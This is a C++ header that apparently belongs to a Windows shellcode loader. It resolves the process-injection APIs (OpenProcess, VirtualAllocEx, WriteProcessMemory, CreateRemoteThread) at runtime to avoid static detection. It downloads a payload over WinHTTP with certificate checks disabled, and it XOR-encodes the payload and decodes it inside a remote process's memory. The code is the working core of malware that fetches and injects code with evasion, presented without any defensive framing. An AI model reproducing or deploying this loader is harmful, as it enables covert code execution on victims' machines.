#pragma once
#include <vector>
#include <Windows.h>
using namespace std;

typedef HANDLE(WINAPI* pOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId);
pOpenProcess OpenProcessPtr;

typedef LPVOID(WINAPI* pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );
pVirtualAllocEx VirtualAllocExPtr;

typedef BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );
pWriteProcessMemory WriteProcessMemoryPtr;

typedef HANDLE(WINAPI* pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId);
pCreateRemoteThread CreateRemoteThreadPtr;

typedef DWORD(WINAPI* pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds);
pWaitForSingleObject WaitForSingleObjectPtr;

typedef BOOL(WINAPI* pReadProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );
pReadProcessMemory ReadProcessMemoryPtr;

typedef BOOL (WINAPI* pVirtualFree)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  dwFreeType
);
pVirtualFree VirtualFreePtr;

vector<BYTE> ReadBinaryFile(const string& filename) {
    ifstream file(filename, ios::binary);
    if (!file) {
        const auto& err = errno;

        char error_message[256];

        strerror_s(error_message, sizeof(error_message), err);

        cerr << "Could not open file: " << filename << ". Error: " << error_message << endl;
        return {};  // Return an empty vector
    }

    // Read file's content
    vector<BYTE> data((istreambuf_iterator<char>(file)), istreambuf_iterator<char>());
    file.close();
    return data;
}


vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    DWORD dwFlags = SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
        SECURITY_FLAG_IGNORE_UNKNOWN_CA;

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);                             // enable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTP_PORT,            // port 80 -> IF HTTPS (443) change this to INTERNET_DEFAULT_HTTPS_PORT
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);                   // No-ssl, if you want SSL change the 0 for WINHTTP_FLAG_SECURE

    bool bRet = WinHttpSetOption(
        hRequest,
        WINHTTP_OPTION_SECURITY_FLAGS,
        &dwFlags,
        sizeof(DWORD)
    );

    // send the request
    bRet = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

static void XOREncoding(vector <BYTE>& data, const BYTE key)
{
    for (auto& byte : data)
    {
        byte ^= key;
    }
}

static void decodeXOR(HANDLE hProcess, LPVOID remoteAddress, size_t numBytes, uint8_t key) {
    vector<uint8_t> buffer(numBytes);

    // Read remote process memory
    SIZE_T bytesRead;
    ReadProcessMemoryPtr = (pReadProcessMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "ReadProcessMemory");

    if (!ReadProcessMemoryPtr(hProcess, remoteAddress, buffer.data(), numBytes, &bytesRead) || bytesRead != numBytes) {
        cerr << "Failed to read memory from remote process.\n";
        return;
    }

    // Decode it using the key.
    for (size_t i = 0; i < numBytes; ++i) {
        buffer[i] ^= key;
    }

    SIZE_T bytesWritten;
    WriteProcessMemoryPtr = (pWriteProcessMemory)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WriteProcessMemory");

    if (!WriteProcessMemoryPtr(hProcess, remoteAddress, buffer.data(), numBytes, &bytesWritten) || bytesWritten != numBytes) {
        cerr << "Failed to write memory to remote process.\n";
        return;
    }
}